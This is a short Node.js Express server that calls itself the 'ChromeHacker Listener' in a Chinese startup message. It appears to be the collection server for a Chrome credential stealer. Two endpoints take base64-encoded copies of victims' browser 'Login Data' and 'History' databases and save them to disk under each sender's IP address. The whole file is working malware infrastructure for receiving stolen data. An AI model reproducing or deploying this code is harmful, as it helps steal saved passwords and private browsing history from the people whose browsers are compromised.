var express = require('express');
var fs = require('fs');
var app = express();
var bodyParser = require('body-parser');
app.use(express.json({ limit: '100mb' }));

var urlencodedParser = bodyParser.urlencoded({ extended: false })

function Log(content) {
    console.log(content)
    fs.appendFile("log.txt", content + "\n", (error) => {
        if (error) return console.log(error);
        return 0;
    });
}

app.post('/logindata', urlencodedParser, function (req, res) {
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
    Log('[' + ip + '][' + req.body.time + '] Get Login Data.');
    fs.writeFile("./logindata/" + ip.replace(/:/g, ".") + ".db", Buffer.from(req.body.data, 'base64'), function (err) {
        if (err) console.log(err);
    });
    res.send("done");
})

app.post('/history', urlencodedParser, function (req, res) {
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
    Log('[' + ip + '][' + req.body.time + '] Get History File.');
    fs.writeFile("./history/" + ip.replace(/:/g, ".") + ".db", Buffer.from(req.body.data, 'base64'), function (err) {
        if (err) console.log(err);
    });
    res.send("done");
})

var server = app.listen(/* 端口 */, function () {
    console.log("\n<ChromeHacker · Listener> 服务端启动成功！端口号：" + server.address().port + "\n");
})
